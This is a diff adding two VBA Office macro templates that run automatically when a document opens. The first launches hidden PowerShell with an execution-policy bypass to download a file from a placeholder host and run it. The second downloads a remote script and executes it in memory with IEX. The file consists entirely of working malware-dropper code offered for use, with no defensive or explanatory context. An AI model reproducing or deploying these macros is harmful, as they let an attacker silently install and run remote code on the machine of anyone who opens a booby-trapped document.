@@ -1,0 +1,20 @@
+'MACRO01
+'Powershell Download file and execute
+
+Private Sub Document_Open()    
+Dim userprofile
+Set objShell = CreateObject("Wscript.shell")
+objShell.Run "powershell.exe -win hidden -ep bypass -c Invoke-WebRequest -Uri 'http://ip/file.ext' -OutFile $env:USERPROFILE'\Downloads\file.ext'", 0, 1
+userprofile = objShell.ExpandEnvironmentStrings("%userprofile%")
+objShell.Run userprofile & "\Downloads\file.ext", 0, False
+End Sub
+
+
+
+'MACRO02
+'Powershell Reads script and execute in memory
+
+Private Sub Document_Open()
+Set objShell = CreateObject("Wscript.shell")
+objShell.Run "powershell.exe -win hidden -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString('http://ip'))", HIDE_WINDOW
+End Sub
